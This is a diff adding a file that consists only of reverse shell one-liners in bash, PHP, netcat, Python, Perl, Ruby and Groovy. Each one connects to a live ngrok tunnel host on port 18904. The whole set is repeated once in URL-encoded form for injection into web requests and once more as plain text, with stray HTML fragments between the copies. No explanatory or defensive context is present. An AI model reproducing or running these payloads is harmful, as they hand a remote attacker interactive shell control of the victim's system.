@@ -1,0 +1,42 @@
+bash -i >& /dev/tcp/8.tcp.ngrok.io/18904 0>&1
+
+php -r '$sock=fsockopen("8.tcp.ngrok.io",18904);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8.tcp.ngrok.io 18904 >/tmp/f
+
+nc -e /bin/sh 8.tcp.ngrok.io 18904
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",18904));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+perl -e 'use Socket;$i="8.tcp.ngrok.io";$p=18904;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+ruby -rsocket -e'f=TCPSocket.open("8.tcp.ngrok.io",18904).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/8.tcp.ngrok.io/18904;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+  
+  
+  bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.tcp.ngrok.io%2F18904%200%3E%261%0A%0Aphp%20-r%20'%24sock%3Dfsockopen(%228.tcp.ngrok.io%22%2C18904)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B'%0A%0Arm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%208.tcp.ngrok.io%2018904%20%3E%2Ftmp%2Ff%0A%0Anc%20-e%20%2Fbin%2Fsh%208.tcp.ngrok.io%2018904%0A%0Apython%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%228.tcp.ngrok.io%22%2C18904))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B'%0A%0Aperl%20-e%20'use%20Socket%3B%24i%3D%228.tcp.ngrok.io%22%3B%24p%3D18904%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B'%0A%0Aruby%20-rsocket%20-e'f%3DTCPSocket.open(%228.tcp.ngrok.io%22%2C18904).to_i%3Bexec%20sprintf(%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf)'%0A%0Ar%20%3D%20Runtime.getRuntime()%0Ap%20%3D%20r.exec(%5B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%22exec%205%3C%3E%2Fdev%2Ftcp%2F8.tcp.ngrok.io%2F18904%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%5C%24line%202%3E%265%20%3E%265%3B%20done%22%5D%20as%20String%5B%5D)%0Ap.waitFor()
+  
+  <html/>
+  
+  bash -i >& /dev/tcp/8.tcp.ngrok.io/18904 0>&1
+
+php -r '$sock=fsockopen("8.tcp.ngrok.io",18904);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8.tcp.ngrok.io 18904 >/tmp/f
+
+nc -e /bin/sh 8.tcp.ngrok.io 18904
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",18904));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+perl -e 'use Socket;$i="8.tcp.ngrok.io";$p=18904;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+ruby -rsocket -e'f=TCPSocket.open("8.tcp.ngrok.io",18904).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/8.tcp.ngrok.io/18904;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+  
+  <html/>
